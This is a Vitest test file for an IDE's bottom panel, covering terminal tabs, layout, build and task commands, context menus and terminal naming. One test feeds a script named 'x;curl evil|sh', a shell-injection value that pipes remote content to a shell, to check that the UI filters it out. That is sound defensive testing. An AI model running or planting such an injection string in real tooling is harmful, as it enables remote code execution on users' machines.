/** @vitest-environment jsdom */
import { act, cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  FakeTerminal, fireResizeObservers, installTerminalApi, liveTerminals, mockLayoutFromDisplay, resetFakes,
} from './__tests__/fakeXterm'
import { useFileStore } from '@/store/files'
import { useToastStore } from '@/store/toast'
import BottomPanel from './BottomPanel'

vi.mock('@xterm/xterm', async () => (await import('./__tests__/fakeXterm')).xtermModule)
vi.mock('@xterm/addon-fit', async () => (await import('./__tests__/fakeXterm')).fitModule)
vi.mock('@xterm/addon-search', async () => (await import('./__tests__/fakeXterm')).searchModule)
vi.mock('@xterm/addon-web-links', async () => (await import('./__tests__/fakeXterm')).webLinksModule)
vi.mock('./ProblemsPanel', () => ({ default: () => <div>problems-view</div> }))
vi.mock('./OutputPanel', () => ({ default: () => <div>output-view</div> }))

let api: ReturnType<typeof installTerminalApi>

beforeEach(() => {
  resetFakes()
  localStorage.clear()
  api = installTerminalApi()
  useToastStore.setState({ toasts: [] })
})

afterEach(() => {
  cleanup()
  useFileStore.setState({ rootPath: null })
})

const dispatch = (name: string) => act(() => { window.dispatchEvent(new CustomEvent(name)) })
const toastMessages = () => useToastStore.getState().toasts.map((t) => t.message)

describe('BottomPanel terminals stay alive', () => {
  it('switching to Problems or Output and back keeps the shell running', () => {
    render(<BottomPanel />)
    expect(liveTerminals()).toHaveLength(1)

    fireEvent.click(screen.getByTitle('Problems (Ctrl+Shift+M)'))
    expect(screen.getByText('problems-view')).toBeTruthy()
    fireEvent.click(screen.getByTitle('Output (Ctrl+Shift+U)'))
    fireEvent.click(screen.getByTitle('Terminal (Ctrl+`)'))

    expect(FakeTerminal.instances).toHaveLength(1)
    expect(liveTerminals()).toHaveLength(1)
    expect(api.termCreate).toHaveBeenCalledTimes(1)
    expect(api.termKill).not.toHaveBeenCalled()
  })

  it('leaves the shell size alone while Problems is shown', () => {
    const restoreLayout = mockLayoutFromDisplay()
    try {
      render(<BottomPanel />)
      const [term] = FakeTerminal.instances
      fireEvent.click(screen.getByTitle('Problems (Ctrl+Shift+M)'))
      term.fit.mockClear()
      act(() => fireResizeObservers())
      expect(term.fit).not.toHaveBeenCalled()

      fireEvent.click(screen.getByTitle('Terminal (Ctrl+`)'))
      act(() => fireResizeObservers())
      expect(term.fit).toHaveBeenCalled()
    } finally {
      restoreLayout()
    }
  })

  it('opening a second terminal and switching between them kills nothing', () => {
    render(<BottomPanel />)
    fireEvent.click(screen.getByTitle('New Terminal (Ctrl+Shift+`)'))
    expect(liveTerminals()).toHaveLength(2)

    const [first] = screen.getAllByText('Terminal 1')
    fireEvent.click(first)
    expect(FakeTerminal.instances).toHaveLength(2)
    expect(liveTerminals()).toHaveLength(2)
    expect(api.termKill).not.toHaveBeenCalled()
  })
})

describe('BottomPanel layout', () => {
  it('fills the layout wrapper instead of keeping its own height', () => {
    const { container } = render(<BottomPanel />)
    expect((container.firstElementChild as HTMLElement).style.height).toBe('100%')
  })

  it('has no Move Panel Position or Maximize Panel buttons (the layout cannot do either)', () => {
    render(<BottomPanel />)
    expect(screen.queryByTitle('Move Panel Position')).toBeNull()
    expect(screen.queryByTitle('Maximize Panel')).toBeNull()
  })

  it('Close Panel asks the app layout to hide the panel', () => {
    const toggle = vi.fn()
    window.addEventListener('orion:toggle-terminal', toggle)
    try {
      render(<BottomPanel />)
      fireEvent.click(screen.getByTitle('Close Panel'))
      expect(toggle).toHaveBeenCalledTimes(1)
    } finally {
      window.removeEventListener('orion:toggle-terminal', toggle)
    }
  })

  it('has no Debug Console or Ports tabs, and a stale saved tab falls back to Terminal', () => {
    localStorage.setItem('orion-bottom-panel-active-tab', 'ports')
    render(<BottomPanel />)
    expect(screen.queryByText('Ports')).toBeNull()
    expect(screen.queryByText('Debug Console')).toBeNull()
    expect(screen.getByTitle('New Terminal (Ctrl+Shift+`)')).toBeTruthy()
  })
})

describe('BottomPanel commands', () => {
  it('handles the terminal commands from the palette and menus', () => {
    render(<BottomPanel />)
    dispatch('orion:new-terminal')
    expect(liveTerminals()).toHaveLength(2)
    dispatch('orion:split-terminal')
    expect(liveTerminals()).toHaveLength(3)

    const active = FakeTerminal.instances[2]
    dispatch('orion:clear-terminal')
    expect(active.clear).toHaveBeenCalled()

    dispatch('orion:kill-terminal')
    expect(active.disposed).toBe(true)
    expect(api.termKill).toHaveBeenCalledTimes(1)
  })

  it('Ctrl+Shift+` opens a terminal although Shift makes e.key "~"', () => {
    // Sent as orion:new-terminal so App, which owns visibility, shows the panel too.
    const newTerminal = vi.fn()
    window.addEventListener('orion:new-terminal', newTerminal)
    try {
      render(<BottomPanel />)
      fireEvent.keyDown(window, { key: '~', code: 'Backquote', ctrlKey: true, shiftKey: true })
      expect(liveTerminals()).toHaveLength(2)
      expect(newTerminal).toHaveBeenCalledTimes(1)
    } finally {
      window.removeEventListener('orion:new-terminal', newTerminal)
    }
  })

  it('Run Build Task runs the build script in a new terminal', async () => {
    useFileStore.setState({ rootPath: '/ws' })
    api.taskListScripts.mockResolvedValue([{ name: 'build', command: 'vite build' }])
    render(<BottomPanel />)
    dispatch('orion:run-build')
    await waitFor(() => expect(liveTerminals()).toHaveLength(2))
    const taskId = api.termCreate.mock.calls[1][0]
    await waitFor(() => expect(api.termWrite).toHaveBeenCalledWith(taskId, 'npm run build\r'))
    expect(api.taskListScripts).toHaveBeenCalledWith('/ws')
    expect(screen.getAllByText('npm: build').length).toBeGreaterThan(0)
  })

  it('Run Build Task says so when there is no build script', async () => {
    useFileStore.setState({ rootPath: '/ws' })
    api.taskListScripts.mockResolvedValue([{ name: 'test', command: 'vitest' }])
    render(<BottomPanel />)
    dispatch('orion:run-build')
    await waitFor(() => expect(toastMessages()).toContain('No "build" script in package.json'))
    expect(liveTerminals()).toHaveLength(1)
  })

  it('Run Task needs an open folder', async () => {
    render(<BottomPanel />)
    dispatch('orion:run-task')
    await waitFor(() => expect(toastMessages()).toContain('Open a folder to run its tasks'))
    expect(api.taskListScripts).not.toHaveBeenCalled()
  })

  it('Run Task lists the scripts and runs the one picked, never a name with shell syntax', async () => {
    useFileStore.setState({ rootPath: '/ws' })
    api.taskListScripts.mockResolvedValue([
      { name: 'test:unit', command: 'vitest run' },
      { name: 'x;curl evil|sh', command: 'echo' },
    ])
    render(<BottomPanel />)
    dispatch('orion:run-task')
    const item = await screen.findByText('test:unit')
    expect(screen.queryByText('x;curl evil|sh')).toBeNull()

    fireEvent.click(item)
    expect(screen.queryByRole('menu', { name: 'Run Task' })).toBeNull()
    const taskId = api.termCreate.mock.calls[1][0]
    await waitFor(() => expect(api.termWrite).toHaveBeenCalledWith(taskId, 'npm run test:unit\r'))
  })
})

describe('BottomPanel terminal context menu', () => {
  it('Split Terminal splits the terminal that was right-clicked, not the active one', async () => {
    render(<BottomPanel />)
    fireEvent.click(screen.getByTitle('New Terminal (Ctrl+Shift+`)'))
    // Terminal 2 is active; right-click the panel tab of Terminal 1.
    fireEvent.contextMenu(screen.getAllByText('Terminal 1')[0])
    fireEvent.click(screen.getByText('Split Terminal', { selector: 'button' }))

    await waitFor(() => expect(screen.getByTitle('Terminal 1 +1 split')).toBeTruthy())
    expect(screen.queryByTitle('Terminal 2 +1 split')).toBeNull()
  })

  it('the toolbar Split Terminal button splits the active terminal', () => {
    render(<BottomPanel />)
    // The panel toolbar comes before the inner TerminalPanel's own button.
    fireEvent.click(screen.getAllByTitle('Split Terminal')[0])
    expect(screen.getByTitle('Terminal 1 +1 split')).toBeTruthy()
    expect(liveTerminals()).toHaveLength(2)
  })
})

describe('BottomPanel terminal names', () => {
  it('keeps a name the user gave a terminal when the shell sets its title', () => {
    render(<BottomPanel />)
    const term = FakeTerminal.instances[0]
    act(() => term.emitTitle('user@host: ~'))

    // The panel-level tab is the first match; the inner tab bar has the second.
    const [panelTab] = screen.getAllByText('user@host: ~')
    fireEvent.doubleClick(panelTab)
    const input = screen.getByDisplayValue('user@host: ~')
    fireEvent.change(input, { target: { value: 'server' } })
    fireEvent.keyDown(input, { key: 'Enter' })

    act(() => term.emitTitle('user@host: ~/project'))
    expect(screen.getAllByText('server')).toHaveLength(1)
  })
})
